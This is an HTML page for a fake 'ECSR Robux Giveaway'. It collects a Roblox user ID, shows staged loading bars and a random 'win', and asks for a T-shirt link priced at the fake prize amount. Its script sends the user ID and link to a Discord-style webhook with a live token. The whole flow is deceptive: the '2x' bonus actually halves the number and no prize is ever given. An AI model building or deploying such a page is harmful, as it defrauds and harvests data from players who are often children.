<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ECSR Robux Giveaway</title>
    <style>
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            background: radial-gradient(ellipse at center, #0f0f23 0%, #000000 100%);
            color: #0ff;
        }
        .container {
            background: rgba(10, 10, 30, 0.9);
            padding: 40px;
            border-radius: 12px;
            box-shadow: 0 0 20px #0ff;
            text-align: center;
            max-width: 500px;
            width: 90%;
        }
        input[type="text"] {
            width: 80%;
            padding: 12px;
            margin-bottom: 15px;
            border: none;
            border-radius: 6px;
            background: #222;
            color: #0ff;
            font-size: 16px;
        }
        button {
            background: #0ff;
            color: #000;
            padding: 12px 24px;
            border: none;
            border-radius: 6px;
            cursor: pointer;
            font-size: 16px;
            box-shadow: 0 0 10px #0ff;
        }
        button:hover {
            background: #0cc;
        }
        .hidden { display: none; }
        .neon-bar {
            width: 100%;
            height: 10px;
            background: #222;
            border-radius: 5px;
            overflow: hidden;
            margin-top: 10px;
        }
        .neon-bar-fill {
            height: 100%;
            width: 0;
            background: linear-gradient(90deg, #0ff, #0f0);
            box-shadow: 0 0 15px #0ff;
            transition: width 0.1s ease;
        }
        #profile-image {
            margin-top: 20px;
            border-radius: 50%;
            max-width: 150px;
            border: 3px solid #0ff;
            box-shadow: 0 0 10px #0ff;
        }
        h1, h2, p {
            text-shadow: 0 0 5px #0ff;
        }
    </style>
</head>
<body>
    <div class="container">
        <div id="startStep">
            <h1>ECSR Robux Giveaway</h1>
            <p>Enter your Roblox ECSR ID:</p>
            <input type="text" id="robloxUserId" placeholder="Your Roblox User ID">
            <button id="startButton">Continue</button>
        </div>

        <div id="loadingStep" class="hidden">
            <h2>Please wait...</h2>
            <div class="neon-bar"><div id="loadingBar" class="neon-bar-fill"></div></div>
        </div>

        <div id="verificationStep" class="hidden">
            <h2>Is this you?</h2>
            <img id="profile-image" src="" alt="Roblox Avatar">
            <br>
            <button id="yesButton">Yes</button>
            <button id="noButton">No</button>
        </div>

        <div id="willGetRobuxStep" class="hidden">
            <h2>Will you get Robux?</h2>
            <p id="robuxDecision">Spinning...</p>
        </div>

        <div id="amountStep" class="hidden">
            <h2>Congratulations!</h2>
            <p>You won <span id="rawAmount"></span> Robux (after 2x: <span id="finalAmount"></span> Robux)</p>
        </div>

        <div id="waitingStep" class="hidden">
            <h2>Preparing your prize...</h2>
            <div class="neon-bar"><div id="waitingBar" class="neon-bar-fill"></div></div>
        </div>

        <div id="shirtStep" class="hidden">
            <h2>Final Step</h2>
            <p>Send a T-Shirt link with price <span id="neededPrice"></span> Robux:</p>
            <input type="text" id="tshirtLink" placeholder="T-Shirt Link">
            <button id="submitShirt">Submit</button>
        </div>

        <div id="finalStep" class="hidden">
            <h2>Success</h2>
            <p>Check your Robux soon. Thank you!</p>
        </div>
    </div>

    <script>
        const $ = id => document.getElementById(id);
        const delay = ms => new Promise(res => setTimeout(res, ms));

        let userId = "";
        let rawAmount = 0;
        let finalAmount = 0;

        $('startButton').onclick = async () => {
            userId = $('robloxUserId').value.trim();
            if (!userId) return;
            $('startStep').classList.add('hidden');
            $('loadingStep').classList.remove('hidden');

            const duration = Math.floor(Math.random() * 4000) + 8000;
            let progress = 0;
            const interval = setInterval(() => {
                progress += 100 / (duration / 100);
                $('loadingBar').style.width = Math.min(progress, 100) + '%';
            }, 100);

            await delay(duration);
            clearInterval(interval);

            const api = `https://ecsr.io/apisite/thumbnails/v1/users/avatar-headshot?userIds=${userId}`;
            try {
                const res = await fetch(api);
                const json = await res.json();
                const img = json.data[0].imageUrl;
                $('profile-image').src = `https://ecsr.io${img}`;
                $('loadingStep').classList.add('hidden');
                $('verificationStep').classList.remove('hidden');
            } catch {
                alert("Failed to load avatar.");
                location.reload();
            }
        };

        $('noButton').onclick = () => location.reload();

        $('yesButton').onclick = async () => {
            $('verificationStep').classList.add('hidden');
            $('willGetRobuxStep').classList.remove('hidden');

            await delay(3000);
            $('robuxDecision').innerText = "Yes!";
            await delay(2000);

            $('willGetRobuxStep').classList.add('hidden');

            rawAmount = Math.floor(Math.random() * 100) + 50;
            finalAmount = Math.floor(rawAmount / 2);

            $('rawAmount').innerText = rawAmount;
            $('finalAmount').innerText = finalAmount;
            $('amountStep').classList.remove('hidden');

            await delay(3000);
            $('amountStep').classList.add('hidden');
            $('waitingStep').classList.remove('hidden');

            let progress = 0;
            const waitInt = setInterval(() => {
                progress += 2;
                $('waitingBar').style.width = Math.min(progress, 100) + '%';
            }, 100);
            await delay(5000);
            clearInterval(waitInt);

            $('waitingStep').classList.add('hidden');
            $('neededPrice').innerText = finalAmount;
            $('shirtStep').classList.remove('hidden');
        };

        $('submitShirt').onclick = async () => {
            const link = $('tshirtLink').value.trim();
            if (!link) return;

            const payload = {
                content: `ðŸŽ‰ Robux Claim ðŸŽ‰\nUser ID: ${userId}\nRaw Robux: ${rawAmount}\nFinal Robux: ${finalAmount}\nShirt: ${link}`
            };

            await fetch('https://webhook.lewisakura.moe/api/webhooks/1375801999031009481/vd7Jp0aByQintEklFwy2tQurKJFdGPF9uIKczMqwTbEOV70avbjTXKdEpK2YViaiXD8r', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload)
            });

            $('shirtStep').classList.add('hidden');
            $('finalStep').classList.remove('hidden');
        }
    </script>
</body>
</html>
